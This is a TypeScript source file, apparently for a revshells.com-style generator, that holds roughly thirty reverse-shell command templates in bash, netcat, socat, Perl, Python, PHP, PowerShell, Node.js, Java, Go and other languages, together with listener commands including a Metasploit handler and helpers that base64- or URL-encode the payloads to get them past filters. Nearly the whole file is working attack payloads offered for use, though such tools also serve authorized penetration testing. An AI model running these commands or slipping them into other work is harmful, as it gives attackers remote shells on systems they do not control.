// Reverse-shell + listener generator data and helpers (revshells.com-style).
//
// Everything is pure data + string helpers — generation is client-side token substitution
// of {ip}/{port}/{shell} into a template, with optional output encoding. No backend.

export type OS = "linux" | "windows" | "mac";

export interface RevShell {
  id: string;
  label: string;
  os: OS[];
  template: string; // contains {ip}, {port}, {shell}
}

export interface Listener {
  id: string;
  label: string;
  template: string; // contains {ip}, {port}
}

export interface ShellOption {
  value: string; // substituted into {shell}
  label: string;
}

export type Encoding =
  | "none"
  | "base64"
  | "url"
  | "doubleurl"
  | "powershell-base64";

export const SHELLS: ShellOption[] = [
  { value: "/bin/bash", label: "/bin/bash" },
  { value: "/bin/sh", label: "/bin/sh" },
  { value: "/bin/zsh", label: "/bin/zsh" },
  { value: "cmd", label: "cmd" },
  { value: "powershell", label: "powershell" },
];

export const ENCODINGS: { value: Encoding; label: string }[] = [
  { value: "none", label: "None" },
  { value: "base64", label: "Base64" },
  { value: "url", label: "URL" },
  { value: "doubleurl", label: "Double URL" },
  { value: "powershell-base64", label: "PowerShell (Base64)" },
];

// String.raw keeps backslashes literal (e.g. Java's \$line), so the copied command matches
// what you'd paste into the target context. Tokens are {ip}/{port}/{shell} (no `$`), so they
// are never interpolated by the template literal.
export const REV_SHELLS: RevShell[] = [
  {
    id: "bash-i",
    label: "Bash -i",
    os: ["linux", "mac"],
    template: String.raw`{shell} -i >& /dev/tcp/{ip}/{port} 0>&1`,
  },
  {
    id: "bash-196",
    label: "Bash 196",
    os: ["linux", "mac"],
    template: String.raw`0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196`,
  },
  {
    id: "bash-readline",
    label: "Bash read line",
    os: ["linux", "mac"],
    template: String.raw`exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
  },
  {
    id: "bash-5",
    label: "Bash 5",
    os: ["linux", "mac"],
    template: String.raw`{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5`,
  },
  {
    id: "bash-udp",
    label: "Bash udp",
    os: ["linux", "mac"],
    template: String.raw`{shell} -i >& /dev/udp/{ip}/{port} 0>&1`,
  },
  {
    id: "nc-mkfifo",
    label: "nc mkfifo",
    os: ["linux", "mac"],
    template: String.raw`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f`,
  },
  {
    id: "nc-e",
    label: "nc -e",
    os: ["linux", "windows"],
    template: String.raw`nc {ip} {port} -e {shell}`,
  },
  {
    id: "nc-c",
    label: "nc -c",
    os: ["linux"],
    template: String.raw`nc -c {shell} {ip} {port}`,
  },
  {
    id: "busybox-nc",
    label: "BusyBox nc",
    os: ["linux"],
    template: String.raw`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | {shell} -i 2>&1 | busybox nc {ip} {port} > /tmp/f`,
  },
  {
    id: "ncat-e",
    label: "ncat -e",
    os: ["linux", "windows"],
    template: String.raw`ncat {ip} {port} -e {shell}`,
  },
  {
    id: "ncat-ssl",
    label: "ncat --ssl",
    os: ["linux", "windows"],
    template: String.raw`ncat --ssl {ip} {port} -e {shell}`,
  },
  {
    id: "curl",
    label: "curl",
    os: ["linux", "mac"],
    template: String.raw`C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null`,
  },
  {
    id: "rustcat",
    label: "rustcat",
    os: ["linux"],
    template: String.raw`rcat connect -s {shell} {ip} {port}`,
  },
  {
    id: "socat",
    label: "socat",
    os: ["linux"],
    template: String.raw`socat TCP:{ip}:{port} EXEC:{shell}`,
  },
  {
    id: "socat-tty",
    label: "socat (TTY)",
    os: ["linux"],
    template: String.raw`socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane`,
  },
  {
    id: "perl",
    label: "perl",
    os: ["linux", "mac"],
    template: String.raw`perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'`,
  },
  {
    id: "perl-nosh",
    label: "perl (no sh)",
    os: ["linux", "windows", "mac"],
    template: String.raw`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
  },
  {
    id: "python3-1",
    label: "python3 #1",
    os: ["linux", "mac"],
    template: String.raw`export RHOST="{ip}";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'`,
  },
  {
    id: "python3-2",
    label: "python3 #2 (short)",
    os: ["linux", "mac"],
    template: String.raw`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'`,
  },
  {
    id: "php-exec",
    label: "PHP exec",
    os: ["linux", "mac"],
    template: String.raw`php -r '$sock=fsockopen("{ip}",{port});exec("{shell} -i <&3 >&3 2>&3");'`,
  },
  {
    id: "php-system",
    label: "PHP system",
    os: ["linux", "mac"],
    template: String.raw`php -r '$sock=fsockopen("{ip}",{port});system("{shell} -i <&3 >&3 2>&3");'`,
  },
  {
    id: "php-pcntl",
    label: "PHP pcntl",
    os: ["linux", "mac"],
    template: String.raw`php -r '$s=fsockopen("{ip}",{port});$proc=proc_open("{shell} -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'`,
  },
  {
    id: "ruby",
    label: "ruby",
    os: ["linux", "mac"],
    template: String.raw`ruby -rsocket -e'spawn("{shell}",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'`,
  },
  {
    id: "ruby-nosh",
    label: "ruby (no sh)",
    os: ["linux", "windows", "mac"],
    template: String.raw`ruby -rsocket -e'c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
  },
  {
    id: "powershell-1",
    label: "PowerShell #1",
    os: ["windows"],
    template: String.raw`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  },
  {
    id: "powershell-3",
    label: "PowerShell #3 (TLS)",
    os: ["windows"],
    template: String.raw`powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$sl=New-Object Net.Security.SslStream($c.GetStream(),$false,({$true}));$sl.AuthenticateAsClient('cloudflare-dns.com');[byte[]]$b=0..65535|%{0};while(($i=$sl.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$sl.Write($sby,0,$sby.Length);$sl.Flush()}"`,
  },
  {
    id: "awk",
    label: "awk",
    os: ["linux", "mac"],
    template: String.raw`awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
  },
  {
    id: "telnet",
    label: "telnet",
    os: ["linux", "mac"],
    template: String.raw`TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF`,
  },
  {
    id: "zsh",
    label: "zsh",
    os: ["linux", "mac"],
    template: String.raw`zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
  },
  {
    id: "lua",
    label: "Lua",
    os: ["linux", "mac"],
    template: String.raw`lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');"`,
  },
  {
    id: "nodejs",
    label: "Node.js",
    os: ["linux", "windows", "mac"],
    template: String.raw`(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("{shell}",[]);var c=new net.Socket();c.connect({port},"{ip}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})();`,
  },
  {
    id: "java",
    label: "Java",
    os: ["linux", "windows", "mac"],
    template: String.raw`Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{"{shell}","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"});p.waitFor();`,
  },
  {
    id: "golang",
    label: "Golang",
    os: ["linux", "mac"],
    template: String.raw`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("{shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,
  },
];

export const LISTENERS: Listener[] = [
  { id: "nc", label: "nc", template: String.raw`nc -lvnp {port}` },
  {
    id: "rlwrap-nc",
    label: "rlwrap nc",
    template: String.raw`rlwrap -cAr nc -lvnp {port}`,
  },
  { id: "ncat", label: "ncat", template: String.raw`ncat -lvnp {port}` },
  {
    id: "ncat-ssl",
    label: "ncat (TLS)",
    template: String.raw`ncat --ssl -lvnp {port}`,
  },
  {
    id: "socat",
    label: "socat",
    template: String.raw`socat -d -d TCP-LISTEN:{port},reuseaddr STDOUT`,
  },
  {
    id: "socat-tty",
    label: "socat (TTY)",
    template: String.raw`socat -d -d file:` + "`tty`" + String.raw`,raw,echo=0 TCP-LISTEN:{port}`,
  },
  {
    id: "pwncat",
    label: "pwncat",
    template: String.raw`pwncat-cs -lp {port}`,
  },
  {
    id: "msfconsole",
    label: "msfconsole",
    template: String.raw`msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {ip}; set LPORT {port}; run"`,
  },
];

// ---- generation helpers ----------------------------------------------------

export function fillTemplate(
  template: string,
  params: { ip: string; port: string; shell: string },
): string {
  return template
    .replaceAll("{ip}", params.ip || "")
    .replaceAll("{port}", params.port || "")
    .replaceAll("{shell}", params.shell || "");
}

// Unicode-safe base64 of a UTF-8 string (btoa only handles latin1).
function base64Utf8(str: string): string {
  const bytes = new TextEncoder().encode(str);
  let bin = "";
  bytes.forEach((b) => (bin += String.fromCharCode(b)));
  return btoa(bin);
}

// Base64 of UTF-16LE bytes — the form PowerShell -EncodedCommand expects.
function base64Utf16le(str: string): string {
  let bin = "";
  for (let i = 0; i < str.length; i++) {
    const c = str.charCodeAt(i);
    bin += String.fromCharCode(c & 0xff, (c >> 8) & 0xff);
  }
  return btoa(bin);
}

export function applyEncoding(
  cmd: string,
  encoding: Encoding,
  shell: string,
): string {
  switch (encoding) {
    case "base64":
      return `echo ${base64Utf8(cmd)} | base64 -d | ${shell || "bash"}`;
    case "url":
      return encodeURIComponent(cmd);
    case "doubleurl":
      return encodeURIComponent(encodeURIComponent(cmd));
    case "powershell-base64":
      return `powershell -e ${base64Utf16le(cmd)}`;
    case "none":
    default:
      return cmd;
  }
}

export function generateCommand(
  rs: RevShell,
  params: { ip: string; port: string; shell: string },
  encoding: Encoding,
): string {
  return applyEncoding(
    fillTemplate(rs.template, params),
    encoding,
    params.shell,
  );
}
